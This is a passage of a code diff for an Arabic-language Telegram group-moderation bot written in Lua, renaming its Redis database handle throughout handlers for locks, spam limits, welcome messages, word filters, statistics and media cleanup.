-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"kick")  
+DevABS:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"kick")  
 end
 if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالتقيد")  
-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"ked")  
+DevABS:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"ked")  
 end
 if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالحذف")  
 end
 if LockText[2] == "التكرار بالطرد" then 
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالطرد")  
 end
 if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالتقيد")  
 end
 if LockText[2] == "التكرار بالكتم" then 
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالكتم")  
 end
 if BasicConstructor(msg) then
 if LockText[2] == "التثبيت" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
-tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevBRAND:set(BRAND.."BRAND:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
+if not DevABS:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
+tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevABS:set(BRAND.."BRAND:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التثبيت")  
-DevBRAND:set(BRAND..'BRAND:Lock:Pin'..msg.chat_id_,true)
-DevBRAND:sadd(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) 
+DevABS:set(BRAND..'BRAND:Lock:Pin'..msg.chat_id_,true)
+DevABS:sadd(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) 
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
 end end end
@@ -7300,68 +7300,68 @@ if tonumber(TextSpam) < 2 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
 end
 end
 if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
 local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
-DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
+DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
 end
 --     Source BRAND     --
 if Manager(msg) then
 if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
 else
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_)
 end end
 if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
-if DevBRAND:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
 else
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Id:Photo'..msg.chat_id_,true)
 end end 
 
 if text and text == 'تفعيل الايدي' and ChCheck(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد مفعل ', 1, 'md')
 else
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Id'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Id'..msg.chat_id_)
 end end 
 if text and text == 'تعطيل الايدي' and ChCheck(msg) then
-if DevBRAND:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Id'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد معطل ', 1, 'md')
 else
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Id'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Id'..msg.chat_id_,true)
 end end
 end
 --     Source BRAND     --
 if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
-DevBRAND:setex(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
+DevABS:setex(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
 end
 if text == 'انشاء رابط' or text == 'انشاء الرابط' then
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
-if not DevBRAND:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_)  then 
+if not DevABS:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_)  then 
 if LinkGp.ok == true then 
 LinkGroup = LinkGp.result
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevABS:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
 end
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
-DevBRAND:setex(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
+DevABS:setex(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
 end
 end
 end
@@ -7370,35 +7370,35 @@ if Admin(msg) then
 if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_,true)
+DevABS:set(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_,true)
 end
 if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_)
 end
-if DevBRAND:get(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
+if DevABS:get(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevBRAND:del(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
 Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
-DevBRAND:set(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_,Welcomes)
+DevABS:set(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_,Welcomes)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الترحيب', 1, 'md')
 return false   
 end
 if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الترحيب الان\n⌁︙تستطيع اضافة مايلي ↫ ⤈\n⌁︙دالة عرض الاسم ↫ firstname\n⌁︙دالة عرض المعرف ↫ username', 1, 'md')
-DevBRAND:set(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevABS:set(BRAND..'BRAND:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الترحيب")  
-DevBRAND:del(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
 end
 if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
-local Welcomes = DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
+local Welcomes = DevABS:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
 if Welcomes then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 else
@@ -7406,77 +7406,77 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم وضع الترحيب \n�
 end
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
+if DevABS:get(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
 if text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء حفظ الوصف", 1, 'md')
-DevBRAND:del(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevBRAND:del(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
 https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير وصف المجموعه', 1, 'md')
 return false  
 end 
 if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
-DevBRAND:set(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevABS:set(BRAND..'BRAND:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الوصف الان', 1, 'md')
 end
 --     Source BRAND     --
 if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
-DevBRAND:set(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
+DevABS:set(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
 return false  
 end    
-if DevBRAND:get(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
+if DevABS:get(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
 if text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر المنع', 1, 'md')
-DevBRAND:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevABS:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 return false  
 end   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم منع الكلمه ↫ "..text, 1, 'html')
-DevBRAND:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
-DevBRAND:hset(BRAND..'BRAND:Filters:'..msg.chat_id_, text,'newword')
+DevABS:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevABS:hset(BRAND..'BRAND:Filters:'..msg.chat_id_, text,'newword')
 return false
 end
 if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
-DevBRAND:set(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
+DevABS:set(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
 return false  
 end    
-if DevBRAND:get(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
+if DevABS:get(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
 if text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الغاء المنع', 1, 'md')
-DevBRAND:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevABS:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 return false  
 end   
-if not DevBRAND:hget(BRAND..'BRAND:Filters:'..msg.chat_id_, text) then  
+if not DevABS:hget(BRAND..'BRAND:Filters:'..msg.chat_id_, text) then  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
-DevBRAND:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevABS:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 else
-DevBRAND:hdel(BRAND..'BRAND:Filters:'..msg.chat_id_, text)
+DevABS:hdel(BRAND..'BRAND:Filters:'..msg.chat_id_, text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
-DevBRAND:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
+DevABS:del(BRAND.."BRAND:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
 end
 return false
 end
 --     Source BRAND     --
 if SudoBot(msg) then
 if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات ⌁" then
-local gps = DevBRAND:scard(BRAND.."BRAND:Groups") local users = DevBRAND:scard(BRAND.."BRAND:Users") 
+local gps = DevABS:scard(BRAND.."BRAND:Groups") local users = DevABS:scard(BRAND.."BRAND:Users") 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙احصائيات البوت ↫ ⤈\n⌁︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
 end
 if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ⌁" then
-local users = DevBRAND:scard(BRAND.."BRAND:Users")
+local users = DevABS:scard(BRAND.."BRAND:Users")
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
 end
 if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ⌁" then
-local gps = DevBRAND:scard(BRAND.."BRAND:Groups")
+local gps = DevABS:scard(BRAND.."BRAND:Groups")
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
 end
 end
 --     Source BRAND     --
 if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
-if not DevBRAND:get(BRAND..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
+if not DevABS:get(BRAND..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
 local Number = tonumber(text:match('^تنظيف (%d+)$')) 
 if Number > 1000 then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
@@ -7488,11 +7488,11 @@ DeleteMessage(msg.chat_id_,{[0]=Message})
 Message = Message - 1048576 
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
-DevBRAND:setex(BRAND..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
+DevABS:setex(BRAND..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
 end 
 end
 if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) then 
-local pv = DevBRAND:smembers(BRAND.."BRAND:Users")
+local pv = DevABS:smembers(BRAND.."BRAND:Users")
 local sendok = 0
 for i = 1, #pv do
 tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
@@ -7501,7 +7501,7 @@ chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100}
 },function(arg,data) 
 if data.ID and data.ID == "Ok" then
 else
-DevBRAND:srem(BRAND.."BRAND:Users",pv[i])
+DevABS:srem(BRAND.."BRAND:Users",pv[i])
 sendok = sendok + 1
 end
 if #pv == i then 
@@ -7519,26 +7519,26 @@ return false
 end
 --     Source BRAND     --
 if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) then 
-local group = DevBRAND:smembers(BRAND.."BRAND:Groups")
+local group = DevABS:smembers(BRAND.."BRAND:Groups")
 local w = 0
 local q = 0
 for i = 1, #group do
 tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
-DevBRAND:srem(BRAND.."BRAND:Groups",group[i]) 
+DevABS:srem(BRAND.."BRAND:Groups",group[i]) 
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = BRAND, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
 w = w + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-DevBRAND:srem(BRAND.."BRAND:Groups",group[i]) 
+DevABS:srem(BRAND.."BRAND:Groups",group[i]) 
 q = q + 1
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-DevBRAND:srem(BRAND.."BRAND:Groups",group[i]) 
+DevABS:srem(BRAND.."BRAND:Groups",group[i]) 
 q = q + 1
 end
 if data and data.code_ and data.code_ == 400 then
-DevBRAND:srem(BRAND.."BRAND:Groups",group[i]) 
+DevABS:srem(BRAND.."BRAND:Groups",group[i]) 
 w = w + 1
 end
 if #group == i then 
@@ -7568,12 +7568,12 @@ end
 if text and (text == "تفعيل امسح" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل امسح مع ميزة الحذف التلقائي للميديا'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Clean'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Lock:Clean'..msg.chat_id_,true)  
 end
 if text and (text == "تعطيل امسح" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل امسح مع ميزة الحذف التلقائي للميديا'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) 
 end
 if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$")) and Constructor(msg) then   
 local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$")
@@ -7581,12 +7581,12 @@ if tonumber(Num) < 50 or tonumber(Num) > 200 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 50 واصغر من 200 للحذف التلقائي', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
-DevBRAND:set(BRAND..'BRAND:CleanNum'..msg.chat_id_,Num) 
+DevABS:set(BRAND..'BRAND:CleanNum'..msg.chat_id_,Num) 
 end end 
-if msg and DevBRAND:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then
-if DevBRAND:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) then CleanNum = DevBRAND:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) else CleanNum = 200 end
-if DevBRAND:scard(BRAND.."BRAND:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
-local List = DevBRAND:smembers(BRAND.."BRAND:cleaner"..msg.chat_id_)
+if msg and DevABS:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) then CleanNum = DevABS:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) else CleanNum = 200 end
+if DevABS:scard(BRAND.."BRAND:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
+local List = DevABS:smembers(BRAND.."BRAND:cleaner"..msg.chat_id_)
 local Del = 0
 for k,v in pairs(List) do
 Del = (Del + 1)
@@ -7594,20 +7594,20 @@ local Message = v
 DeleteMessage(msg.chat_id_,{[0]=Message})
 end
 SendText(msg.chat_id_,"⌁︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
-DevBRAND:del(BRAND.."BRAND:cleaner"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:cleaner"..msg.chat_id_)
 end 
 end 
 if Cleaner(msg) then
-if DevBRAND:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then 
+if DevABS:get(BRAND..'BRAND:Lock:Clean'..msg.chat_id_) then 
 if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
-local M = DevBRAND:scard(BRAND.."BRAND:cleaner"..msg.chat_id_)
+local M = DevABS:scard(BRAND.."BRAND:cleaner"..msg.chat_id_)
 if M ~= 0 then
-Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M.."\n⌁︙الحذف التلقائي ↫ "..(DevBRAND:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
+Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M.."\n⌁︙الحذف التلقائي ↫ "..(DevABS:get(BRAND..'BRAND:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
 end end
 if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND.."BRAND:cleaner"..msg.chat_id_)
+local List = DevABS:smembers(BRAND.."BRAND:cleaner"..msg.chat_id_)
 local Del = 0
 for k,v in pairs(List) do
 Del = (Del + 1)
@@ -7616,7 +7616,7 @@ DeleteMessage(msg.chat_id_,{[0]=Message})
 end
 if Del ~= 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف "..Del.." من الميديا", 1, 'md') 
-DevBRAND:del(BRAND.."BRAND:cleaner"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:cleaner"..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
 end end 
@@ -7650,75 +7650,75 @@ if Admin(msg) then
 if text and text:match("^فتح (.*)$") then
 local UnLockText = {string.match(text, "^(فتح) (.*)$")}
 if UnLockText[2] == "التعديل" then
-if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التعديل")  
-DevBRAND:del(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
-if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
